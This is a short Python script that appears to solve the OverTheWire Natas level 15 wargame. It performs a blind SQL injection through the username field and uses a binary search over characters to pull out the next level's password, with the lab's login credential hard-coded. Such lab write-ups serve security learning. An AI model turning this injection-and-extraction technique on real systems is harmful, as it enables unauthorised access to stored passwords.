#!/bin/python3
# python3 binarySearch.py "^WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
import requests
import sys
import string

char = string.digits+string.ascii_uppercase+string.ascii_lowercase
MAX = len(char)
password_len = 32

# use the opener to fetch a URL
url = 'http://natas15.natas.labs.overthewire.org/?debug=1'
qstring = 'natas16\" AND password COLLATE latin1_general_cs REGEXP \"^'
matchStr = "This user exist"

def isMatch(values):
	r = requests.post(url,auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data=values)
	return (matchStr in r.text)


def binarySearch(start, end, current):
	if start == (end - 1):
		return char[start]

	mid = (start + end) // 2
	testStr = char[start:mid]
	values = {'username' : qstring + current + '[' + testStr + ']'}

	if isMatch(values):
		return binarySearch(start, mid, current)
	return binarySearch(mid, end, current)

def main():
	searchStr = ""

	for pos in range(password_len):
		searchStr += binarySearch(0, MAX, searchStr)
		print (searchStr)

	print ("done")

main()
